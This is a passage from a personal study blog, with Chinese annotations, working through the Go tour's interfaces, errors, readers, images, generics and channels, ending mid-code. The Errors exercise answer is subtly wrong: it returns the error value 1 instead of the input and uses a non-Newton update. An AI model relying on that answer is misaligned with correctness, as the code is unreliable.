class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Abser <span class="keyword">interface</span> &#123;</span><br><span class="line">Abs() <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a Abser</span><br><span class="line">f := MyFloat(-math.Sqrt2)</span><br><span class="line">v := Vertex&#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">a = f  <span class="comment">// a MyFloat implements Abser</span></span><br><span class="line">a = &amp;v <span class="comment">// a *Vertex implements Abser</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// In the following line, v is a Vertex (not *Vertex)</span></span><br><span class="line"><span class="comment">// and does NOT implement Abser.</span></span><br><span class="line">a = v</span><br><span class="line"></span><br><span class="line">fmt.Println(a.Abs())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyFloat <span class="type">float64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f MyFloat)</span></span> Abs() <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">if</span> f &lt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="type">float64</span>(-f)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="type">float64</span>(f)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">X, Y <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Vertex)</span></span> Abs() <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> math.Sqrt(v.X*v.X + v.Y*v.Y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>If the concrete value inside the interface itself is nil, the method will be called with a nil receiver.<br>In some languages this would trigger a null pointer exception, but <strong>in Go it is common to write methods that gracefully handle being called with a nil receiver</strong> (as with the method <code>M</code> in this example.)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *T)</span></span> M() &#123;</span><br><span class="line"><span class="keyword">if</span> t == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;&lt;nil&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(t.S)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> i I</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> t *T</span><br><span class="line">i = t</span><br><span class="line">describe(i)</span><br><span class="line">i.M()</span><br><span class="line"></span><br><span class="line">i = &amp;T&#123;<span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line">describe(i)</span><br><span class="line">i.M()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>A nil interface value holds neither value nor concrete type.<br>Calling a method on a nil interface is a run-time error because there is no type inside the interface tuple to indicate which <em>concrete</em> method to call.</p></li><li><p>The interface type that specifies zero methods is known as the <em>empty interface</em>:<code>interface&#123;&#125;</code><br>An empty interface may hold values of any type. (Every type implements at least zero methods.)</p></li><li><p>A <em><code>type assertion</code></em> provides access to an interface value’s underlying concrete value.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; = <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line">s := i.(<span class="type">string</span>)</span><br><span class="line">fmt.Println(s)</span><br><span class="line"></span><br><span class="line">s, ok := i.(<span class="type">string</span>)</span><br><span class="line">fmt.Println(s, ok)</span><br><span class="line"></span><br><span class="line">f, ok := i.(<span class="type">float64</span>)  <span class="comment">// 接收ok，则即使断言失败也不会触发panic</span></span><br><span class="line">fmt.Println(f, ok)</span><br><span class="line"></span><br><span class="line">f = i.(<span class="type">float64</span>) <span class="comment">// panic</span></span><br><span class="line">fmt.Println(f)</span><br></pre></td></tr></table></figure></li><li><p>A <em>type switch</em> is a construct that permits several type assertions in series.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> v := i.(<span class="keyword">type</span>) &#123;  <span class="comment">// .(type) 是固定语法</span></span><br><span class="line"><span class="keyword">case</span> T:</span><br><span class="line">  <span class="comment">// here v has type T</span></span><br><span class="line"><span class="keyword">case</span> S:</span><br><span class="line">  <span class="comment">// here v has type S</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">// no match; here v has the same type as i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The declaration in a type switch has the same syntax as a type assertion <code>i.(T)</code>, but the specific type <code>T</code> is replaced with the keyword <code>type</code>.</p></li></ul><h2 id="Exercise-Stringers"><strong><a href="https://go.dev/tour/methods/18">Exercise: Stringers</a></strong></h2><p>One of the most ubiquitous interfaces is <a href="https://go.dev/pkg/fmt/#Stringer"><code>Stringer</code></a> defined by the <a href="https://go.dev/pkg/fmt/"><code>fmt</code></a> package.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Stringer <span class="keyword">interface</span> &#123;</span><br><span class="line">    String() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A <code>Stringer</code> is a type that can describe itself as a string. The <code>fmt</code> package (and many others) look for this interface to print values.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%v (%v years)&quot;</span>, p.Name, p.Age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := Person&#123;<span class="string">&quot;Arthur Dent&quot;</span>, <span class="number">42</span>&#125;</span><br><span class="line">z := Person&#123;<span class="string">&quot;Zaphod Beeblebrox&quot;</span>, <span class="number">9001</span>&#125;</span><br><span class="line">fmt.Println(a, z)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Arthur Dent (42 years) Zaphod Beeblebrox (9001 years)</span></span><br></pre></td></tr></table></figure><p>Exercise Answer:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> IPAddr [<span class="number">4</span>]<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Add a &quot;String() string&quot; method to IPAddr.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ip IPAddr)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%v.%v.%v.%v&quot;</span>, ip[<span class="number">0</span>], ip[<span class="number">1</span>], ip[<span class="number">2</span>], ip[<span class="number">3</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">hosts := <span class="keyword">map</span>[<span class="type">string</span>]IPAddr&#123;</span><br><span class="line"><span class="string">&quot;loopback&quot;</span>:  &#123;<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"><span class="string">&quot;googleDNS&quot;</span>: &#123;<span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name, ip := <span class="keyword">range</span> hosts &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%v: %v\n&quot;</span>, name, ip)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Exercise-Errors"><a href="https://go.dev/tour/methods/20">Exercise: Errors</a></h2><p>The <code>error</code> type is a built-in interface similar to <code>fmt.Stringer</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(As with <code>fmt.Stringer</code>, the <code>fmt</code> package looks for the <code>error</code> interface when printing values.)</p><p>Functions often return an <code>error</code> value, and calling code should handle errors by testing whether the error equals <code>nil</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i, err := strconv.Atoi(&quot;42&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">    fmt.Printf(&quot;couldn&#x27;t convert number: %v\n&quot;, err)</span><br><span class="line">    return</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(&quot;Converted integer:&quot;, i)</span><br></pre></td></tr></table></figure><p>A nil <code>error</code> denotes success; a non-nil <code>error</code> denotes failure</p><p>Exercise Answer:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a new type</span></span><br><span class="line"><span class="keyword">type</span> ErrNegativeSqrt <span class="type">float64</span>  <span class="comment">// 通过对该类型实现Error()使其成为一种error类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// and make it an error by giving it a</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e ErrNegativeSqrt)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;cannot Sqrt negative number: %v&quot;</span>, <span class="type">float64</span>(e))  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sqrt</span><span class="params">(x <span class="type">float64</span>)</span></span> (<span class="type">float64</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, ErrNegativeSqrt(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">z := <span class="number">1.0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">z -= (z*z - x) / (<span class="number">2</span>*x)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> z, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(Sqrt(<span class="number">2</span>))</span><br><span class="line">fmt.Println(Sqrt(<span class="number">-2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Note:</strong> A call to <code>fmt.Sprint(e)</code> inside the <code>Error</code> method will send the program into an infinite loop. You can avoid this by converting <code>e</code> first: <code>fmt.Sprint(float64(e))</code>. Why?</p><blockquote><p>因为e变量是一个通过实现Error()的接口函数成为了error类型，那么<strong>在fmt.Sprint(e)时就会调用e.Error()来输出错误的字符串信息</strong>，于是函数就变成了如下等价形式，因此会陷入死循环中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e ErrNegativeSqrt)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprint(e.Error())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h2 id="Exercise-Readers"><a href="https://go.dev/tour/methods/22">Exercise: Readers</a></h2><p>The <code>io</code> package specifies the <code>io.Reader</code> interface, which represents the read end of a stream of data: <code>func (T) Read(b []byte) (n int, err error)</code></p><p><code>Read</code> populates the given byte slice with data and returns the number of bytes populated and an error value. It returns an <code>io.EOF</code> error when the stream ends.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := strings.NewReader(<span class="string">&quot;Hello, Reader!&quot;</span>)</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">n, err := r.Read(b)</span><br><span class="line">fmt.Printf(<span class="string">&quot;n = %v err = %v b = %v\n&quot;</span>, n, err, b)</span><br><span class="line">fmt.Printf(<span class="string">&quot;b[:n] = %q\n&quot;</span>, b[:n])</span><br><span class="line"><span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">n = 8 err = &lt;nil&gt; b = [72 101 108 108 111 44 32 82]</span></span><br><span class="line"><span class="comment">b[:n] = &quot;Hello, R&quot;</span></span><br><span class="line"><span class="comment">n = 6 err = &lt;nil&gt; b = [101 97 100 101 114 33 32 82]</span></span><br><span class="line"><span class="comment">b[:n] = &quot;eader!&quot;</span></span><br><span class="line"><span class="comment">n = 0 err = EOF b = [101 97 100 101 114 33 32 82]</span></span><br><span class="line"><span class="comment">b[:n] = &quot;&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>Exercise Answer:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;golang.org/x/tour/reader&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyReader <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Add a Read([]byte) (int, error) method to MyReader.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mr MyReader)</span></span> Read(b []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">b[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>, <span class="literal">nil</span>  <span class="comment">// 返回的第一个int类型参数表示读到字节数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">reader.Validate(MyReader&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exercise-rot13Reader"><a href="https://go.dev/tour/methods/23">Exercise: rot13Reader</a></h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> rot13Reader <span class="keyword">struct</span> &#123;</span><br><span class="line">r io.Reader</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Go中使用&#x27;&#x27;表示byte(相当于C中的char, 但Go中无char),</span></span><br><span class="line"><span class="comment">// 使用&quot;&quot;表示string, 二者不能混用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rot13</span><span class="params">(ch <span class="type">byte</span>)</span></span> <span class="type">byte</span> &#123;</span><br><span class="line"><span class="keyword">switch</span> &#123;  <span class="comment">// while true, 这种switch常被用于替换if-else</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span> &lt;= ch &amp;&amp; ch &lt;= <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">ch += <span class="number">13</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span> &lt; ch &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">ch -= <span class="number">13</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span> &lt;= ch &amp;&amp; ch &lt;= <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">ch += <span class="number">13</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span> &lt; ch &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">ch -= <span class="number">13</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ch</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mr rot13Reader)</span></span> Read(b []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">n, e := mr.r.Read(b)</span><br><span class="line"><span class="keyword">for</span> idx := <span class="keyword">range</span>(b) &#123;</span><br><span class="line">b[idx] = rot13(b[idx])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n, e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := strings.NewReader(<span class="string">&quot;Lbh penpxrq gur pbqr!&quot;</span>)</span><br><span class="line">r := rot13Reader&#123;s&#125;</span><br><span class="line">io.Copy(os.Stdout, &amp;r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exercise-Images"><strong><a href="https://go.dev/tour/methods/25">Exercise: Images</a></strong></h2><p><a href="https://go.dev/pkg/image/#Image">Package image</a> defines the <code>Image</code> interface:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package image</span><br><span class="line"></span><br><span class="line">type Image interface &#123;</span><br><span class="line">    ColorModel() color.Model</span><br><span class="line">    Bounds() Rectangle</span><br><span class="line">    At(x, y int) color.Color</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>color.Color</code> and <code>color.Model</code> types are also interfaces, but we’ll ignore that by using the predefined implementations <code>color.RGBA</code> and <code>color.RGBAModel</code>. These interfaces and types are specified by the <a href="https://go.dev/pkg/image/color/">image/color package</a></p><p>Exercise Answer:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;golang.org/x/tour/pic&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;image&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;image/color&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Image <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(img Image)</span></span> ColorModel() color.Model &#123;</span><br><span class="line"><span class="keyword">return</span> color.RGBAModel</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(img Image)</span></span> Bounds() image.Rectangle &#123;</span><br><span class="line"><span class="keyword">return</span> image.Rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>, <span class="number">200</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(img Image)</span></span> At(x, y <span class="type">int</span>) color.Color &#123;</span><br><span class="line"><span class="keyword">return</span> color.RGBA&#123;<span class="type">uint8</span>(x),<span class="type">uint8</span>(y),<span class="type">uint8</span>(<span class="number">255</span>),<span class="type">uint8</span>(<span class="number">255</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">m := Image&#123;&#125;</span><br><span class="line">pic.ShowImage(m)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Generics"><a href="https://go.dev/tour/generics">Generics</a></h1><p>The type parameters of a function appear between brackets, before the function’s arguments.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span>[<span class="title">T</span> <span class="title">comparable</span>]<span class="params">(s []T, x T)</span></span> <span class="type">int</span></span><br></pre></td></tr></table></figure><p><code>comparable</code> is a useful constraint that makes it possible to use the <code>==</code> and <code>!=</code> operators on values of the type. In this example, we use it to compare a value to all slice elements until a match is found. This <code>Index</code> function works for any type that supports comparison.</p><p>In addition to generic functions, Go also supports generic types.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// List represents a singly-linked list that holds</span></span><br><span class="line"><span class="comment">// values of any type.</span></span><br><span class="line"><span class="keyword">type</span> List[T any] <span class="keyword">struct</span> &#123;</span><br><span class="line">next *List[T]</span><br><span class="line">val  T</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Concurrency"><a href="https://go.dev/tour/concurrency">Concurrency</a></h1><ul><li><p>Channels are a typed conduit through which you can send and receive values with the channel operator, <code>&lt;-</code>.<br>By default, sends and receives block until the other side is ready. This allows goroutines to synchronize without explicit locks or condition variables.</p></li><li><p>Channels can be <em>buffered</em>. Provide the buffer length as the second argument to <code>make</code> to initialize a buffered channel:<code>ch := make(chan int, 100)</code><br>Sends to a buffered channel block only when the buffer is full. Receives block when the buffer is empty.</p><blockquote><p>注意写法是<code>chan int</code>, chan表示channel</p></blockquote></li><li><p>A sender can <code>close</code> a channel to indicate that no more values will be sent. <code>v, ok := &lt;-ch</code></p></li><li><p>The <code>select</code> statement lets a goroutine wait on multiple communication operations.<br>A <code>select</code> blocks until one of its cases can run, then it executes that case. It chooses one at random if multiple are ready.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(c, quit <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">x, y := <span 